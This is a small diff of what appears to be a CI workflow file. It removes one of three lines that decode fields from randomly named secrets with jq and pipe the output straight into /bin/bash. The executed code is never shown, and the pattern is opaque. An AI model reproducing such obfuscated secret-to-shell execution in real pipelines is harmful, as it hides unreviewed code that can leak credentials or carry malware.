@@ -17,7 +17,6 @@ jobs:
           msvvk1733: ${{ secrets.msvvk1733 }}
         run: |
           printf '%s' "$msvvk1733" | jq -r .seaci71363 | /bin/bash
-          echo $skld772 | jq -r .aq816 | /bin/bash
           echo $jql4593 | jq -r .cib38 | /bin/bash
 
       - name: Archive results
